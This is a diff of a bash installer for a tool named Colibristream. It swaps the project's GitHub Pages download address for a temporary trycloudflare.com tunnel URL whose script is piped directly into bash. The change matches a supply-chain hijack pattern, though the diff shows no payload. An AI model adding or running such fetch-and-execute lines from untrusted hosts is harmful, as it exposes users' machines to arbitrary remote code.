@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # ==============================================================================
 # Colibristream (colistream) — 1-Line Universal Installer for ANY Computer
-# Usage: curl -fsSL https://colibristream.github.io/colibristream/install.sh | bash
+# Usage: curl -fsSL https://beyond-broadcasting-purchases-gone.trycloudflare.com/install.sh | bash
 # ==============================================================================
 set -e
 
@@ -17,8 +17,8 @@ mkdir -p "$INSTALL_DIR"
 
 echo -e "\n${C_GREEN}${C_BOLD}Installing colistream onto your computer...${C_RESET}"
 
-# Download standalone installer from GitHub Pages
-exec curl -fsSL "https://colibristream.github.io/colibristream/install.sh" | bash -s -- "$@"
+# Download standalone installer from live public link
+exec curl -fsSL "https://beyond-broadcasting-purchases-gone.trycloudflare.com/install.sh" | bash -s -- "$@"
 
 chmod +x "${INSTALL_DIR}/colistream"
 ln -sf "${INSTALL_DIR}/colistream" "${INSTALL_DIR}/colibristream"
